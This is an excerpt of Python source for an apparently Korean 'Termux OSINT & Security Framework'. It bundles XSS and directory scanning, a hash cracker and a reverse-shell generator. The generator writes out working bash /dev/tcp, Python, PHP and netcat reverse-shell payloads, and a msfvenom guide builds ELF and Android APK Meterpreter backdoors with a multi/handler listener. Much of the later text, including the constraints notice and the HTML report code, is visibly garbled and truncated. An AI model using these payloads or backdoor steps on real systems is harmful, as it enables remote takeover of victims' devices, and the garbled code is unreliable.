"""
Termux OSINT & Security Framework - Advanced Edition
도메인 또는 IP 주소에 대한 광범위한 공개 출처 정보(OSINT) 및 고도화된 보안 분석을 수행하는 종합 도구입니다.

추가 및 강화된 기능:
1. 멀티 언어 공격 모듈 및 페이로드 생성기 강화 (Reverse Shell, Bind Shell, Meterpreter 가이드, Termux 제약사항 안내)
2. 웹 취약점 스캐너 및 익스플로잇 검색 기능 고도화 (XSS/SQLi 스캐너, 디렉토리 브루트포싱, CMS 취약점 스캐너, Exploit-DB 검색)
3. 네트워크 및 시스템 분석 기능 확장 (서비스 버전 감지, 공유 호스팅 감지)
4. 암호학 및 유틸리티 강화 (해시 크래커, 패스워드 리스트 생성기)
5. 쉘 스크립트 기반 통합 설치 프로그램 (install.sh) 제공
"""
...
{Colors.YELLOW}        - Termux OSINT & Security Framework v2.0 -{Colors.RESET}
"""
    print(banner)
    print(f"{Colors.MAGENTA}{Colors.BOLD}====================================================={Colors.RESET}")
    print(f"{Colors.WHITE}  도메인/IP 정보 수집, 취약점 스캔 및 보안 분석 통합 프레임워크{Colors.RESET}")
    print(f"{Colors.MAGENTA}{Colors.BOLD}====================================================={Colors.RESET}\n")
...
def reverse_ip_lookup(ip_address):
    try:
        ...
        # 역방향 조회 실패 시 해커타겟 API 활용하여 공유 호스팅 정보 함께 조회 시도
    ...
    for param in params:
        for payload in xss_payloads:
            ...
            try:
                test_url = base_url + "?" + urllib.parse.urlencode(test_params, doseq=True)
                response = requests.get(test_url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
                # 페이로드가 응답 본문에 그대로 반사(Reflected)되는지 확인
...
def dir_bruteforcer(url, custom_wordlist_path=None):
    ...
    for word in wordlist:
        ...
        try:
            # 리다이렉트 비허용하여 200, 301, 302, 403 코드 감지
...
def cms_scanner(url):
    ...
    try:
        ...
        if wp_meta and "wordpress" in wp_meta.get("content", "").lower():
            ...
            # wp-links-opml.php 또는 readme.html 분석을 통한 우회 탐지
        ...
        # 알려진 취약점 검색 매핑 데이터 (Local Database)
        vuln_db = {
            "WordPress": {
    ...
    for port in ports:
        try:
            ...
            if port == 80 or port == 8080:
                ...
                # SSL 핸드셰이크는 별도 처리되므로 기본 소켓 배너 수집 시도
                sock.sendall(b"\r\n\r\n")
...
def hash_cracker(target_hash, custom_wordlist_path=None):
    ...
    # 기본 탑 50 워드리스트
    default_passwords = [
        "123456", "password", "123456789", "12345678", "12345", "1234567", "qwerty", "admin", 
...
def generate_reverse_shell(lhost, lport):
    """다양한 언어의 Reverse Shell 페이로드 생성"""
    payloads = {
        "Bash (TCP)": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "Python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"sh\")'",
        "PHP (fsockopen)": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"sh <&3 >&3 2>&3\");'",
        "Netcat Classic": f"nc {lhost} {lport} -e sh",
        "Netcat FIFO (우회형)": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
    }
    return payloads

def generate_bind_shell(lport):
    """다양한 언어의 Bind Shell 페이로드 생성"""
    payloads = {
...
def get_meterpreter_guideline(lhost, lport):
    """Metasploit 연동을 위한 Meterpreter 페이로드 생성 가이드라인"""
    guideline = f"""
{Colors.GREEN}[*] Meterpreter Payload Generation Guide (msfvenom & msfconsole){Colors.RESET}

1. Linux Target (ELF Executable):   $ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > shell.elf
...
3. Android Target (APK Package
   $ msfvenom -p android/metepreter/reverse_tcp LHOST={lhost} LPORT={lport} R > backdoor.ap
4. Multi/Handler Listener Setup (msfconsole)
   $ msfconso
   msf6 > us exploit/multi/handler
   msf6 expoit(multi/handler) > set PAYLOAD <선택한_페이로드>
   msf6 eloit(multi/handler) > set LHOST {lhost}
   msf6xploit(multi/handler) > set LPORT {lport}
   msf exploit(multi/handler) > exploit -j
"
   return guidelin
def show_termux_cnstraints():
    """경에서의 제약사항 상세 안내"""
   straints = f"""lors.YELLOW}[!] Termux 환경에서의 페이로드 바인딩 및 공격 모듈 제약사항 안내{Colors
1. {Colors.BOLD}비루트(Non-root) 포트 바인딩 제한{Colors.RE
   - Termux는 기본적으로 루팅되지 않은 안드로실행됩니다.
   - 따라서 {Colors.RED}1024 이하의 Well-n 포트(예: 80, 443, 22 등)는 바인딩할 수 없습니다.{Colors.RESET}
   - 리스너(Listener)를 구동할 때는1024 이상의 포트(예: 4444, 8080)를 사용
2. {Colors.BOLD}SELinux 및 안드로이드 보안 정책{Color
   - 최신 안드로이드 OS의 SELinux 강제 정책으로 Termux 내에서 특정 시스템 호출이나 원격 쉘 실행이 제한될 수 있습니다.
   - 쉘 실행 시 아키텍처 불일치(AArch64x64)로 컴파일된 바이너리가 실행되지 않을 수 있으므로, Python/Bash 기반 페이로드를 권장합
3. {Colors.BOLD}안드로이드 전력 관리(배터리 최적화) 정책{Colors.RE
   - 백그라운드에서 실행되는 리버스 쉘이나 리스너가 의 절전 기능에 의해 강제 종료될 수 있습니다.
   - 지속적인 연결을 위해서는 Termux 앱 설정에터리 최적화 예외'를 설정해야 합
4. {Colors.BOLD}개념 증명(PoC) 한계 및 안전 권고{Color
   - 본 도구의 페이로드 생성 기능은 오직 {Colo}학습 및 모의 침투 테스트(PoC) 목적{Colors.RESET}으로만 설계되었습니다.
   - 인가되지 않은주입 및 쉘 획득 시도는 정보통신망법 위반으로 엄격히 처벌받을 수 있
# --- Main Scan & HTM
def generate_ort(target, data = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    filename = f"repoet.replace('.', '_')}_{datetime.now().strftime('%Y%m%d%H%M
    # 웹 기술 정보를 사진처럼 시각화하기  if "Web Tech" in data and isinstance(data["Web Tech"], dict):
        colors = ["#ff45"#5f9ea0", "#ffd700", "#adff2f", "#ff69   tech_items = []
        for k, v in data["Web Tech"].
            tech_items.appendspan class="dot" style="background-color:{colors[i % len(colors)]}"></span> <strong>{k}</strong
        tech_html = "<ul>"    # Helper>Comprehensive OSINT & Security Report - {target}</ti
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Velor: #0d1117; color: #c9d1d9; padding: 20px; line-height: 1.6; }}
        .container {{ max-width: 1000px; maground: #161b22; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }}
        h1 {{ color: #58a6f: 1px solid #30363d; padding-bottom: 10px; text-align: centere; margin-top: 30px; border-bottom: 1px dashed #30363d; padding-bottom: 5px; }}
        h3 {{ color: #79c0ff; marg
   25px; padding: 15px; background: #0d1117; border-radius: 8px; border: 1px soli      .subsection {{ margin-left: 20px; margin-top: 10px; padding: 10px; background: #010409; border-left: 3px solid #f0883e; border-radius: 5px; }}
        ul {{ list-style: none;
        lign-items: center; font-size: 0.95em; margin-bottom: 5dot {{ width: 10px; height: 10px; border-radius: 50%; margin-right: 8px; flex-shrink: 0; }}
        pre {{ background: #010s: 5px; overflow-x: auto; color: #8b949e; font-size: 0.85em; white-space: pre-wrap; word-wrap: break-word; border: 1px solid #30363d; }}
        .footercenter; margin-top: 40
        <h1>Comprehenurity Report</h1>
     rget:</strong> {target} | <strong>Scan Timh2>1. Information Gathering</h2>
            <div class="subsectnformation</h3><pre>{data.get('Whois', 'No data')}</pre></div>
     ion"><h3>DNS Information</h3><pre>{sj(data.get('DNS', {}))}</pre></div>       <div class="subsection"><h3>IP Geolocation</h3><pre>{sj(data.get('Geolocation', {}))}</pre></div>
        ...
        <div class="footer">Generated by Termux OSINT & Security Framework v2.0</div>
    </div>
</body>
</html>
    """
...
def run_full_scan(target):
    ...
    if ip:
        ...
        data["Ping Sweep"] = ping_sweep(ip.rsplit('.', 1)[0] + '.1', ip.rsplit('.', 1)[0] + '.10') # 범위를 10개로 축소하여 속도 향상
        data["Network Latency"] = network_latency_check(ip)
    else:
        data["Port Scan"] = "IP 주소를 찾을 수 없어 건너뜁니다."
        data["Service Versions"] = "IP 주소를 찾을 수 없어 건너뜁니다."
